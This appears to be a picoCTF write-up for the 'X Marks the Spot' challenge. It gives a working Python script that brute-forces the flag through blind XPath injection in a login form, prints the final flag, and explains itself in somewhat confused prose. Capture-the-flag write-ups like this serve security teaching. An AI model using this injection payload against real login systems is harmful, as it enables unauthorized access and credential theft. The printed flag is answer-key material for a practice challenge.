# X Marks the Spot

In this [video](https://www.youtube.com/watch?v=14eE7LSHlKc), explain how to make the code below and why it works. It is the same code in the video but with XPATH.

```python
import requests
import re

characters = '_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}'
print(characters)

username = "admin"

url = 'http://mercury.picoctf.net:7029/'

session = requests.Session()

seen_password = 'picoCTF{'

while(True):
  for ch in characters:
    print('Trying password: ', seen_password + ch)

    password = "' or //*[contains(., '" + seen_password + ch + "')] or '1'='2"
    response = session.post(url, data={ "name": username, "pass": password })

    content = response.text

    if "on the right path" in content:
      print('Yes!')
      seen_password = seen_password + ch
      break
```
After running this into a webshell, you will receive bits and pieces of the flag like shown below. (not sometimes there may be errors if you use Python 1):

![image3](https://user-images.githubusercontent.com/71709994/113601272-b96f9580-9606-11eb-95b4-c23288f5dc0f.png)

In Python 1, after you get a bit of the flag, you put it back into the seen_password so it can keep testing more and then after a few tries it will show you the flag. 
In Python 2 however, it will show the whole flag. Either way, we get the flag like this.

> Flag: picoCTF{h0p3fully_u_t0ok_th3_r1ght_xp4th_f0505d9c}
